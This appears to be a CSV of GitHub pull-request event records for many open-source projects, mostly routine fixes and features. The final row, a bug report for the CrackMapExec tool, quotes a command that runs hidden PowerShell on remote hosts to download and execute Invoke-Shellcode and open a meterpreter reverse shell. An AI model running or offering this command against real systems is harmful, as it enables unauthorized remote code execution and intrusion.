,type,created_at,repo_id,repo_name,actor_id,actor_login,org_id,org_login,pr_id,pr_node_id,pr_title,pr_state,pr_locked,pr_number,pr_body,pr_issue_url,pr_merged_at,pr_closed_at,pr_updated_at,pr_commits,pr_additions,pr_deletions,pr_changed_files,pr_author_association,pr_assignees,pr_requested_reviewers,pr_requested_teams,pr_merged_by_login,pr_merged_by_id,pr_merged_by_type,pr_merged_by_site_admin,pr_label,pr_patch_url,pr_commits_url
2059,PullRequestEvent,2018-07-25 09:30:41+00:00,1113646,kurtmckee/feedparser,109483,dme,,,203775840,MDExOlB1bGxSZXF1ZXN0MjAzNzc1ODQw,Ensure that `pieces` is strings *before* using `startswith`.,open,False,140,Conversion of `pieces` to strings rather than bytes happened too late for the `div` removing loop. Move the conversion earlier.,https://api.github.com/repos/kurtmckee/feedparser/issues/140,,,2018-07-25T09:30:40Z,1,5,5,1,NONE,[],[],[],,,,,[],https://github.com/kurtmckee/feedparser/pull/140.patch,https://api.github.com/repos/kurtmckee/feedparser/pulls/140/commits
2063,PullRequestEvent,2018-07-30 23:00:35+00:00,70314805,kyuupichan/electrumx,3319176,kyuupichan,,,204662061,MDExOlB1bGxSZXF1ZXN0MjA0NjYyMDYx,Add Decred support,open,False,540,,https://api.github.com/repos/kyuupichan/electrumx/issues/540,,,2018-07-30T23:00:35Z,3,384,29,9,CONTRIBUTOR,[],[],[],,,,,[],https://github.com/kyuupichan/electrumx/pull/540.patch,https://api.github.com/repos/kyuupichan/electrumx/pulls/540/commits
2068,PullRequestEvent,2017-06-05 20:43:41+00:00,70314805,kyuupichan/electrumx,3319176,kyuupichan,,,124049467,,fix a typo,closed,False,191,Fixes a typo.,https://api.github.com/repos/kyuupichan/electrumx/issues/191,2017-06-05T20:43:41Z,2017-06-05T20:43:41Z,2017-06-05T20:43:41Z,1,1,1,1,[],[],[],[],kyuupichan,3319176,User,False,[],https://github.com/kyuupichan/electrumx/pull/191.patch,https://api.github.com/repos/kyuupichan/electrumx/pulls/191/commits
2069,PullRequestEvent,2018-03-17 00:18:21+00:00,70314805,kyuupichan/electrumx,3319176,kyuupichan,,,175524708,,Add arihanc to various coins,closed,False,416,"Bitcoin Cash add .onion
Bitcoin Cash testnet add clear-net and onion

Bitcoin add clear-net and onion
Bitcoin Testnet add onion",https://api.github.com/repos/kyuupichan/electrumx/issues/416,2018-03-17T00:18:21Z,2018-03-17T00:18:21Z,2018-03-17T00:18:21Z,5,6,0,1,NONE,[],[],[],kyuupichan,3319176,User,False,[],https://github.com/kyuupichan/electrumx/pull/416.patch,https://api.github.com/repos/kyuupichan/electrumx/pulls/416/commits
2151,PullRequestEvent,2017-03-25 10:04:40+00:00,32004001,theolind/pymysensors,3181692,MartinHjelmare,,,112581165,,Update readme about support for bootloaders,open,False,88,Closes #82.,https://api.github.com/repos/theolind/pymysensors/issues/88,,,2017-03-25T10:04:40Z,1,1,1,1,[],[],[],[],,,,,[],https://github.com/theolind/pymysensors/pull/88.patch,https://api.github.com/repos/theolind/pymysensors/pulls/88/commits
2167,PullRequestEvent,2018-01-02 23:24:13+00:00,8557809,FGRibreau/mailchecker,15472,datio,,,160823573,,"Add 2144 hosts from ivolo/disposable-email-domains, closes #117",open,False,123,"Adds unique hosts, diff'd from the MIT licensed list of ivolo/disposable-email-domains",https://api.github.com/repos/FGRibreau/mailchecker/issues/123,,,2018-01-02T23:24:13Z,1,3,1,1,CONTRIBUTOR,[],[],[],,,,,[],https://github.com/FGRibreau/mailchecker/pull/123.patch,https://api.github.com/repos/FGRibreau/mailchecker/pulls/123/commits
2179,PullRequestEvent,2016-02-27 15:59:44+00:00,24219208,LettError/MutatorMath,1243961,LettError,,,60954739,,Change travis to unified-font-object ufoLib.,open,False,27,,https://api.github.com/repos/LettError/MutatorMath/issues/27,,,2016-02-27T15:59:43Z,1,2,2,1,[],[],[],[],,,,,[],https://github.com/LettError/MutatorMath/pull/27.patch,https://api.github.com/repos/LettError/MutatorMath/pulls/27/commits
2189,PullRequestEvent,2018-08-04 23:41:40+00:00,776374,alecthomas/voluptuous,6806011,dotlambda,,,206214578,MDExOlB1bGxSZXF1ZXN0MjA2MjE0NTc4,Use m2r instead of pypandoc,open,False,357,"Pypandoc causes a lot of headaches:
- pandoc is sometimes difficult to install
- pypandoc is not compatible with the latest version of pandoc

M2r provides a lightweight, pure-Python alternative.",https://api.github.com/repos/alecthomas/voluptuous/issues/357,,,2018-08-04T23:41:40Z,1,4,4,1,NONE,[],[],[],,,,,[],https://github.com/alecthomas/voluptuous/pull/357.patch,https://api.github.com/repos/alecthomas/voluptuous/pulls/357/commits
2195,PullRequestEvent,2015-12-07 21:41:22+00:00,6598202,cgoldberg/xvfbwrapper,1113081,cgoldberg,,,52745715,,Add MIT license to source,closed,False,7,"PyPi says that this package is MIT licensed, but its nicer if there's an LICENSE file that explicitly states the license of the source code. Adding a vanilla MIT license text to this repo. Happy to modify in any way you want Corey, just let me know. ",https://api.github.com/repos/cgoldberg/xvfbwrapper/issues/7,2015-12-07T21:41:22Z,2015-12-07T21:41:22Z,2015-12-07T21:41:22Z,1,25,0,1,[],[],[],[],cgoldberg,1113081,User,False,[],https://github.com/cgoldberg/xvfbwrapper/pull/7.patch,https://api.github.com/repos/cgoldberg/xvfbwrapper/pulls/7/commits
2205,PullRequestEvent,2015-05-18 09:37:42+00:00,20194501,denis-ryzhkov/mem_top,207457,treemo,,,35616629,,fix: python3,open,False,1,test on python 2.7 and 3.4,https://api.github.com/repos/denis-ryzhkov/mem_top/issues/1,,,2015-05-18T09:37:42Z,1,1,1,1,[],[],[],[],,,,,[],https://github.com/denis-ryzhkov/mem_top/pull/1.patch,https://api.github.com/repos/denis-ryzhkov/mem_top/pulls/1/commits
2250,PullRequestEvent,2016-05-10 09:00:39+00:00,24561828,gunthercox/ChatterBot,2030578,gunthercox,,,69470697,,Add mailgun output adapter,open,False,165,"I created a [mailgun](https://www.mailgun.com/) email adapter a while back but was unable to get it set up to retrieve mail from the account's inbox (I forget the reason but I will look back into it). For the time being, I have converted the completed part of the adapter into an OutputAdapter, pending the merge of #163.",https://api.github.com/repos/gunthercox/ChatterBot/issues/165,,,2016-05-10T09:00:39Z,1,79,0,3,[],[],[],[],,,,,[],https://github.com/gunthercox/ChatterBot/pull/165.patch,https://api.github.com/repos/gunthercox/ChatterBot/pulls/165/commits
2261,PullRequestEvent,2016-10-09 23:05:08+00:00,43780191,jgonggrijp/pip-review,1540185,jgonggrijp,,,52891473,,Add test for #2,closed,False,3,"Add a test that installs pip<6.0 to trigger the error with older pip versions, verifies that #2 exists and will pass when it's resolved. Probably shouldn't merge this until it's fixed unless you don't mind the builds failing :)",https://api.github.com/repos/jgonggrijp/pip-review/issues/3,2016-10-09T23:05:08Z,2016-10-09T23:05:08Z,2016-10-09T23:05:08Z,1,6,0,1,[],"[{'login': 'jgonggrijp', 'id': 1540185, 'avatar_url': 'https://avatars.githubusercontent.com/u/1540185?v=3', 'gravatar_id': '', 'url': 'https://api.github.com/users/jgonggrijp', 'html_url': 'https://github.com/jgonggrijp', 'followers_url': 'https://api.github.com/users/jgonggrijp/followers', 'following_url': 'https://api.github.com/users/jgonggrijp/following{/other_user}', 'gists_url': 'https://api.github.com/users/jgonggrijp/gists{/gist_id}', 'starred_url': 'https://api.github.com/users/jgonggrijp/starred{/owner}{/repo}', 'subscriptions_url': 'https://api.github.com/users/jgonggrijp/subscriptions', 'organizations_url': 'https://api.github.com/users/jgonggrijp/orgs', 'repos_url': 'https://api.github.com/users/jgonggrijp/repos', 'events_url': 'https://api.github.com/users/jgonggrijp/events{/privacy}', 'received_events_url': 'https://api.github.com/users/jgonggrijp/received_events', 'type': 'User', 'site_admin': False}]",[],[],jgonggrijp,1540185,User,False,[],https://github.com/jgonggrijp/pip-review/pull/3.patch,https://api.github.com/repos/jgonggrijp/pip-review/pulls/3/commits
2298,PullRequestEvent,2017-04-24 18:09:20+00:00,61946515,oldani/HtmlTestRunner,7053628,theodoretripp,,,117324763,,Add install details to Readme.rst,open,False,3,Thanks for this package @oldani ! It works great.  ,https://api.github.com/repos/oldani/HtmlTestRunner/issues/3,,,2017-04-24T18:09:20Z,1,18,2,1,[],[],[],[],,,,,[],https://github.com/oldani/HtmlTestRunner/pull/3.patch,https://api.github.com/repos/oldani/HtmlTestRunner/pulls/3/commits
2300,PullRequestEvent,2017-03-08 15:30:30+00:00,58094079,orbingol/NURBS-Python,6615252,jedufour,,,109718655,,Import and evaluation of NURBS,open,False,4,"Function (based on `read_ctrlpts()` ) to read NURBS (control points and weights).
Example files of a NURBS surface (a cylinder)
Minor issues fixed (numbering and ordering inside the `evaluation_rational()` function)",https://api.github.com/repos/orbingol/NURBS-Python/issues/4,,,2017-03-08T15:30:30Z,3,100,15,3,[],[],[],[],,,,,[],https://github.com/orbingol/NURBS-Python/pull/4.patch,https://api.github.com/repos/orbingol/NURBS-Python/pulls/4/commits
2305,PullRequestEvent,2018-02-11 10:14:28+00:00,120163244,raimon49/pip-licenses,221802,raimon49,,,168395348,,Implement output HTML,closed,False,5,"* [x] Implement function
* [x] Testing
* [x] Add a document
* [x] Bump version
* [x] Release to PyPI",https://api.github.com/repos/raimon49/pip-licenses/issues/5,2018-02-11T10:14:28Z,2018-02-11T10:14:28Z,2018-02-11T10:14:28Z,3,59,6,4,OWNER,[],[],[],raimon49,221802,User,False,[],https://github.com/raimon49/pip-licenses/pull/5.patch,https://api.github.com/repos/raimon49/pip-licenses/pulls/5/commits
2306,PullRequestEvent,2017-01-03 11:50:17+00:00,77853058,raphaelm/python-fints,64280,raphaelm,,,99941742,,Added 1822direkt to the list of tested banks,closed,False,2,I tested the example code with an account of the 1822direkt (Sparkasse Frankfurt) - works as expected. Thank you for the python port!,https://api.github.com/repos/raphaelm/python-fints/issues/2,2017-01-03T11:50:17Z,2017-01-03T11:50:17Z,2017-01-03T11:50:17Z,1,1,0,1,[],[],[],[],raphaelm,64280,User,False,[],https://github.com/raphaelm/python-fints/pull/2.patch,https://api.github.com/repos/raphaelm/python-fints/pulls/2/commits
2323,PullRequestEvent,2018-01-28 08:15:06+00:00,83989500,rytilahti/python-miio,2735933,syssi,,,165556659,,"Philips Bulb: New setter ""bricct"" added",open,False,186,Brightness and color temperature can be set at once.,https://api.github.com/repos/rytilahti/python-miio/issues/186,,,2018-01-28T08:15:05Z,1,49,0,2,COLLABORATOR,[],[],[],,,,,[],https://github.com/rytilahti/python-miio/pull/186.patch,https://api.github.com/repos/rytilahti/python-miio/pulls/186/commits
2326,PullRequestEvent,2018-02-14 07:21:29+00:00,83989500,rytilahti/python-miio,2735933,syssi,,,169037858,,Use the path parameter of encode/decode again to be future-proof,open,False,223,"
cp. https://github.com/rytilahti/python-miio/pull/220#issuecomment-365515104",https://api.github.com/repos/rytilahti/python-miio/issues/223,,,2018-02-14T07:21:29Z,1,8,8,4,COLLABORATOR,[],[],[],,,,,[],https://github.com/rytilahti/python-miio/pull/223.patch,https://api.github.com/repos/rytilahti/python-miio/pulls/223/commits
2329,PullRequestEvent,2016-07-28 14:09:04+00:00,26881329,santosjorge/cufflinks,10043087,shivam6294,,,79202325,,Add the `connected` parameter to the go_offline() function what gets passed to init_notebook_mode(),open,False,42,https://github.com/plotly/plotly.py/blob/master/plotly/offline/offline.py - line #96 (see change in function signature),https://api.github.com/repos/santosjorge/cufflinks/issues/42,,,2016-07-28T14:09:04Z,2,58,58,2,[],[],[],[],,,,,[],https://github.com/santosjorge/cufflinks/pull/42.patch,https://api.github.com/repos/santosjorge/cufflinks/pulls/42/commits
2348,PullRequestEvent,2016-10-29 15:42:24+00:00,58070676,thombashi/sqlitebiter,15517661,thombashi,,,91492648,,Add support for Markdown,closed,False,16,,https://api.github.com/repos/thombashi/sqlitebiter/issues/16,2016-10-29T15:42:24Z,2016-10-29T15:42:24Z,2016-10-29T15:42:24Z,8,81,64,10,[],[],[],[],thombashi,15517661,User,False,[],https://github.com/thombashi/sqlitebiter/pull/16.patch,https://api.github.com/repos/thombashi/sqlitebiter/pulls/16/commits
2349,PullRequestEvent,2016-07-17 14:26:56+00:00,58070676,thombashi/sqlitebiter,15517661,thombashi,,,77736643,,Develop,closed,False,9,,https://api.github.com/repos/thombashi/sqlitebiter/issues/9,2016-07-17T14:26:55Z,2016-07-17T14:26:55Z,2016-07-17T14:26:55Z,4,9,12,7,[],[],[],[],thombashi,15517661,User,False,[],https://github.com/thombashi/sqlitebiter/pull/9.patch,https://api.github.com/repos/thombashi/sqlitebiter/pulls/9/commits
2382,PullRequestEvent,2017-08-19 16:09:28+00:00,15857755,DenisCarriere/geocoder,550895,DenisCarriere,,,135797578,,add baidu reverse,closed,False,275,,https://api.github.com/repos/DenisCarriere/geocoder/issues/275,2017-08-19T16:09:28Z,2017-08-19T16:09:28Z,2017-08-19T16:09:28Z,4,472,3,14,[],[],[],[],DenisCarriere,550895,User,False,[],https://github.com/DenisCarriere/geocoder/pull/275.patch,https://api.github.com/repos/DenisCarriere/geocoder/pulls/275/commits
2386,PullRequestEvent,2016-12-02 12:44:37+00:00,15857755,DenisCarriere/geocoder,2411041,akittas,,,96273669,,Added option to modify server url for custom mapzen server,open,False,219,"Since mapzen is open source and can run anywhere, I was thinking that we can customize the server url if the user provides one, so that the geocoder can work with any server running a mapzen api.",https://api.github.com/repos/DenisCarriere/geocoder/issues/219,,,2016-12-02T12:44:37Z,1,2,2,2,[],[],[],[],,,,,[],https://github.com/DenisCarriere/geocoder/pull/219.patch,https://api.github.com/repos/DenisCarriere/geocoder/pulls/219/commits
2397,PullRequestEvent,2016-08-01 07:15:28+00:00,39780739,adamchainz/pretty-cron,857609,adamchainz,,,79496157,,Upgrade requirements,closed,False,27,,https://api.github.com/repos/adamchainz/pretty-cron/issues/27,2016-08-01T07:15:27Z,2016-08-01T07:15:27Z,2016-08-01T07:15:27Z,1,1,1,1,[],[],[],[],adamchainz,857609,User,False,[],https://github.com/adamchainz/pretty-cron/pull/27.patch,https://api.github.com/repos/adamchainz/pretty-cron/pulls/27/commits
2427,PullRequestEvent,2016-12-06 15:42:06+00:00,24529855,goldmann/docker-squash,43489,goldmann,,,96745801,,Hash computation optimizations,closed,False,137,"Instead of reading whole layer into memory, read it in 10MB
chunks.

Fixes #132",https://api.github.com/repos/goldmann/docker-squash/issues/137,2016-12-06T15:42:02Z,2016-12-06T15:42:03Z,2016-12-06T15:42:03Z,1,19,5,1,[],[],[],[],goldmann,43489,User,False,[],https://github.com/goldmann/docker-squash/pull/137.patch,https://api.github.com/repos/goldmann/docker-squash/pulls/137/commits
2432,PullRequestEvent,2017-03-24 08:56:36+00:00,9983183,gvalkov/jenkins-webapi,1117699,jeduden,,,112411498,,Bump version: 0.5.2 -> 0.5.3,open,False,20,"The master branch includes a critical fix for communicating with jenkins. 
It would be great if you could publish this fix in a new version on pypi. ",https://api.github.com/repos/gvalkov/jenkins-webapi/issues/20,,,2017-03-24T08:56:36Z,1,4,4,4,[],[],[],[],,,,,[],https://github.com/gvalkov/jenkins-webapi/pull/20.patch,https://api.github.com/repos/gvalkov/jenkins-webapi/pulls/20/commits
2449,PullRequestEvent,2015-12-25 20:04:10+00:00,8277199,jsocol/django-jsonview,180459,jsocol,,,54592769,,Drop JSON_USE_DJANGO_SERIALIZER,open,False,26,,https://api.github.com/repos/jsocol/django-jsonview/issues/26,,,2015-12-25T20:04:10Z,1,33,33,3,[],[],[],[],,,,,[],https://github.com/jsocol/django-jsonview/pull/26.patch,https://api.github.com/repos/jsocol/django-jsonview/pulls/26/commits
2475,PullRequestEvent,2018-03-18 09:06:34+00:00,124495375,rohanpm/more-executors,26634292,bors[bot],,,175741227,,Introduce SyncExecutor,closed,False,34,"Executors callables synchronously, in the calling thread.

Mainly for testing.  A major motivation of introducing this is to
use it from within this module's own test suite.",https://api.github.com/repos/rohanpm/more-executors/issues/34,2018-03-18T09:06:34Z,2018-03-18T09:06:34Z,2018-03-18T09:06:34Z,1,97,34,5,OWNER,[],[],[],bors[bot],26634292,Bot,False,[],https://github.com/rohanpm/more-executors/pull/34.patch,https://api.github.com/repos/rohanpm/more-executors/pulls/34/commits
2488,PullRequestEvent,2016-03-01 19:38:40+00:00,35341934,svenkreiss/pysparkling,2775078,svenkreiss,,,61294689,,use .format() instead of str(),closed,False,34,,https://api.github.com/repos/svenkreiss/pysparkling/issues/34,2016-03-01T19:38:39Z,2016-03-01T19:38:39Z,2016-03-01T19:38:39Z,1,2,2,1,[],[],[],[],svenkreiss,2775078,User,False,[],https://github.com/svenkreiss/pysparkling/pull/34.patch,https://api.github.com/repos/svenkreiss/pysparkling/pulls/34/commits
2490,PullRequestEvent,2016-05-15 13:27:02+00:00,52094644,thombashi/DataProperty,15517661,thombashi,,,70121226,,Develop,open,False,15,,https://api.github.com/repos/thombashi/DataProperty/issues/15,,,2016-05-15T13:27:02Z,6,38,44,13,[],[],[],[],,,,,[],https://github.com/thombashi/DataProperty/pull/15.patch,https://api.github.com/repos/thombashi/DataProperty/pulls/15/commits
2496,PullRequestEvent,2017-08-18 11:32:36+00:00,98913174,vidartf/ipydatawidgets,510760,vidartf,,,136072433,,Add another choice of union deserializers on the JS side,closed,False,3,"Now end-user can choose whether the union deserializer always gives an array, or if it gives a widget/array as appropriate. The second option is needed in cases where one wants to listen to change events.

Based on #2.",https://api.github.com/repos/vidartf/ipydatawidgets/issues/3,2017-08-18T11:32:35Z,2017-08-18T11:32:35Z,2017-08-18T11:32:35Z,9,341,186,26,[],[],[],[],vidartf,510760,User,False,[],https://github.com/vidartf/ipydatawidgets/pull/3.patch,https://api.github.com/repos/vidartf/ipydatawidgets/pulls/3/commits
2523,PullRequestEvent,2016-02-25 19:54:35+00:00,41490550,agriffis/vcrpy-unittest,50637,agriffis,,,59139922,,Adding examples for vcrpy-unittest,closed,False,2,"A coworker had some issues with figuring out how to do things using this VCR unittest.
I figured I would put some examples in to help anyone else who had these issues.",https://api.github.com/repos/agriffis/vcrpy-unittest/issues/2,,2016-02-25T19:54:34Z,2016-02-25T19:54:34Z,2,33,0,2,[],[],[],[],,,,,[],https://github.com/agriffis/vcrpy-unittest/pull/2.patch,https://api.github.com/repos/agriffis/vcrpy-unittest/pulls/2/commits
2565,PullRequestEvent,2015-09-25 17:59:13+00:00,1778869,jsocol/django-ratelimit,180459,jsocol,,,45882250,,Support missing headers,closed,False,86,"Currently the decorator raises a KeyError if the User Agent header isn't present, this patch fixes the issue",https://api.github.com/repos/jsocol/django-ratelimit/issues/86,2015-09-25T17:59:09Z,2015-09-25T17:59:09Z,2015-09-25T17:59:09Z,2,2,1,2,[],[],[],[],jsocol,180459,User,False,[],https://github.com/jsocol/django-ratelimit/pull/86.patch,https://api.github.com/repos/jsocol/django-ratelimit/pulls/86/commits
2576,PullRequestEvent,2015-06-02 09:52:04+00:00,9376661,lorenzofox3/Smart-Table,2402022,lorenzofox3,,,36710552,,fix(stConfig): use `skipNatural` correctly,closed,False,409,,https://api.github.com/repos/lorenzofox3/Smart-Table/issues/409,2015-06-02T09:52:03Z,2015-06-02T09:52:03Z,2015-06-02T09:52:03Z,1,25,2,2,[],[],[],[],lorenzofox3,2402022,User,False,[],https://github.com/lorenzofox3/Smart-Table/pull/409.patch,https://api.github.com/repos/lorenzofox3/Smart-Table/pulls/409/commits
2580,PullRequestEvent,2016-09-01 20:16:42+00:00,9376661,lorenzofox3/Smart-Table,8402760,alext9586,,,83699373,,Make styling easier,open,False,709,"I added a couple lines to add style classes to make it easier for styling. Currently, I need this so I could add a pointer cursor to the TH elements and didn't want to manually have to add the class to each TH element. I figure it might help others out to scope the parent table so they can use SASS or LESS for styling.",https://api.github.com/repos/lorenzofox3/Smart-Table/issues/709,,,2016-09-01T20:16:42Z,1,6,10,5,[],[],[],[],,,,,[],https://github.com/lorenzofox3/Smart-Table/pull/709.patch,https://api.github.com/repos/lorenzofox3/Smart-Table/pulls/709/commits
2582,PullRequestEvent,2015-01-14 13:52:00+00:00,9376661,lorenzofox3/Smart-Table,2402022,lorenzofox3,,,27348376,,#276 - pagination - st-items-by-page should support string values,closed,False,277,,https://api.github.com/repos/lorenzofox3/Smart-Table/issues/277,2015-01-14T13:52:00Z,2015-01-14T13:52:00Z,2015-01-14T13:52:00Z,1,1,1,3,[],[],[],[],lorenzofox3,2402022,User,False,[],https://github.com/lorenzofox3/Smart-Table/pull/277.patch,https://api.github.com/repos/lorenzofox3/Smart-Table/pulls/277/commits
2599,PullRequestEvent,2012-03-06 06:57:15+00:00,1060073,omab/django-social-auth,91022,omab,,,933903,,OAuth2 backend bails on HTTP 400s in access token requests,closed,[],282,"From [the spec section about error responses to access token requests](http://tools.ietf.org/html/draft-ietf-oauth-v2-23#section-4.1.4):

>    The authorization server responds with an HTTP 400 (Bad Request) status code and includes the following parameters with the response

This code is in `BaseOAuth2.auth_complete`:

    response = simplejson.loads(urlopen(request).read())

And because `urllib2.urlopen` will raise `HTTPError` whenever it sees a response that's not 2xx, that causes an unhandled exception.

The code block just below that line tries to handle that case:

        if response.get('error'):
            error = response.get('error_description') or response.get('error')
            raise ValueError('OAuth2 authentication failed: %s' % error)

But it's never reached.

`ConsumerBasedOAuth.auth_complete` looks like it does something anticipating this status code:

        except HTTPError, e:
            if e.code == 400:
                raise AuthCanceled(self)
            else:
                raise

I have added a patch that handles 400s in the same way, although I'm not certain if `AuthCanceled` or `AuthFailed` is more appropriate for the OAuth2 scenario.",https://github.com/omab/django-social-auth/issues/282,2012-03-06T06:57:14Z,2012-03-06T06:57:14Z,2012-03-06T06:57:14Z,1,5,0,1,[],[],[],[],omab,91022,,,[],https://github.com/omab/django-social-auth/pull/282.patch,[]
2605,PullRequestEvent,2016-03-27 05:45:00+00:00,7133153,omab/python-social-auth,91022,omab,,,54976416,,Minor backend fixes,closed,False,815,"* amazon backend: change authorization URL from http to https
* twilio backend: fix backend name in comment",https://api.github.com/repos/omab/python-social-auth/issues/815,2016-03-27T05:44:59Z,2016-03-27T05:44:59Z,2016-03-27T05:44:59Z,2,2,2,2,[],[],[],[],omab,91022,User,False,[],https://github.com/omab/python-social-auth/pull/815.patch,https://api.github.com/repos/omab/python-social-auth/pulls/815/commits
2614,PullRequestEvent,2016-07-17 06:53:10+00:00,7133153,omab/python-social-auth,91022,omab,,,74368627,,Line support added,closed,False,937,Line (https://line.me/en/) messenger OAuth2 support.,https://api.github.com/repos/omab/python-social-auth/issues/937,2016-07-17T06:53:10Z,2016-07-17T06:53:10Z,2016-07-17T06:53:10Z,1,96,0,3,[],[],[],[],omab,91022,User,False,[],https://github.com/omab/python-social-auth/pull/937.patch,https://api.github.com/repos/omab/python-social-auth/pulls/937/commits
2626,PullRequestEvent,2017-10-22 19:46:46+00:00,11059073,rm-hull/luma.led_matrix,305679,thijstriemstra,,,148009913,,document rotate option,closed,False,126,,https://api.github.com/repos/rm-hull/luma.led_matrix/issues/126,2017-10-22T19:46:45Z,2017-10-22T19:46:45Z,2017-10-22T19:46:45Z,1,3,1,1,COLLABORATOR,[],[],[],thijstriemstra,305679,User,False,[],https://github.com/rm-hull/luma.led_matrix/pull/126.patch,https://api.github.com/repos/rm-hull/luma.led_matrix/pulls/126/commits
2629,PullRequestEvent,2015-04-29 23:59:47+00:00,1690483,slashmili/python-jalali,585764,slashmili,,,34355121,,Compatible with python 3.x,closed,False,16,With travis tests running in python 3.3/3.4,https://api.github.com/repos/slashmili/python-jalali/issues/16,2015-04-29T23:59:47Z,2015-04-29T23:59:47Z,2015-04-29T23:59:47Z,4,23,19,4,[],[],[],[],slashmili,585764,User,False,[],https://github.com/slashmili/python-jalali/pull/16.patch,https://api.github.com/repos/slashmili/python-jalali/pulls/16/commits
2653,PullRequestEvent,2015-01-27 15:32:20+00:00,8490649,Anorov/cloudflare-scrape,1465533,mikey1234,,,28117567,,Update cfscrape.py,open,False,10,try this instead,https://api.github.com/repos/Anorov/cloudflare-scrape/issues/10,,,2015-01-27T15:32:18Z,1,146,61,1,[],[],[],[],,,,,[],https://github.com/Anorov/cloudflare-scrape/pull/10.patch,https://api.github.com/repos/Anorov/cloudflare-scrape/pulls/10/commits
2665,PullRequestEvent,2016-01-08 15:51:29+00:00,3491275,WoLpH/python-progressbar,270571,WoLpH,,,55460108,,Fix negative ETA,closed,False,47,"Often I see a ETA like this:
`99% (2811 of 2822) |############## | Elapsed Time: 0:00:35 ETA:  -1 day, 23:59:58`",https://api.github.com/repos/WoLpH/python-progressbar/issues/47,2016-01-08T15:51:29Z,2016-01-08T15:51:29Z,2016-01-08T15:51:29Z,1,4,1,1,[],[],[],[],WoLpH,270571,User,False,[],https://github.com/WoLpH/python-progressbar/pull/47.patch,https://api.github.com/repos/WoLpH/python-progressbar/pulls/47/commits
2671,PullRequestEvent,2015-10-18 22:40:57+00:00,40718289,byt3bl33d3r/CrackMapExec,1813669,DanMcInerney,,,48020068,,"replaced "".decode('utf8')"" with ""unicode(x, errors='ignore')""",open,False,16,"Was running the cmd:

./crackmapexec.py -t 25 some-ips.txt --execm wmi -u user -p password -x ""cmd.exe /c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <MY IP> -Lport 443 -Force""

After all the fail/success messages at logging in, it tried to display the output of running the powershell command but failed:

Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/dist-packages/gevent/greenlet.py"", line 327, in run
    result = self._run(*self.args, **self.kwargs)
  File ""./crackmapexec.py"", line 2981, in connect
    print_att(result)
  File ""./crackmapexec.py"", line 63, in <lambda>
    print_att    = lambda x: cprint(x.decode('utf8'), 'yellow', attrs=['bold'])
  File ""/usr/lib/python2.7/encodings/utf_8.py"", line 16, in decode
    return codecs.utf_8_decode(input, errors, True)
UnicodeDecodeError: 'utf8' codec can't decode byte 0x83 in position 83: invalid start byte
<Greenlet at 0x396a410: connect('<VICTIMIP>')> failed with UnicodeDecodeError

The offending code:

```python
                elif args.execm == 'wmi':
                    executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share, noOutput)
                    result = executer.run(host, smb)
                    if result:
                        print_succ('{}:{} {} Executed specified command via WMI'.format(host, args.port, s_name))
                        print_att(result)
```

The variable result is just the powershell error message but it contains a character ""\x83"" for some reason which apparently is not utf8 decodeable. 

""Invoke-Shellcode : A positional parameter cannot be found that accepts argument\r\n '\x83??Payload'.\r\nAt line:1 char:171\r\n+ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.\r\ncom/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); In\r\nvoke-Shellcode <<<<  \x83??Payload windows/meterpreter/reverse_https \x83??Lhost IP\r\nIP \x83??Lport 443 \x83??Force\r\n    + CategoryInfo          : InvalidArgument: (:) [Invoke-Shellcode], Paramet \r\n   erBindingException\r\n    + FullyQualifiedErrorId : PositionalParameterNotFound,Invoke-Shellcode\r\n \r\n""

So I googled the unicode error and it lead me to: http://stackoverflow.com/questions/12468179/unicodedecodeerror-utf8-codec-cant-decode-byte-0x9c and I replaced all x.decode('utf8') with unicode(x, errors='ignore') and that seemed to fix the problem as it'll still print everything it can, it'll just ignore any nonunicode characters.
",https://api.github.com/repos/byt3bl33d3r/CrackMapExec/issues/16,,,2015-10-18T22:40:56Z,1,7,7,1,[],[],[],[],,,,,[],https://github.com/byt3bl33d3r/CrackMapExec/pull/16.patch,https://api.github.com/repos/byt3bl33d3r/CrackMapExec/pulls/16/commits
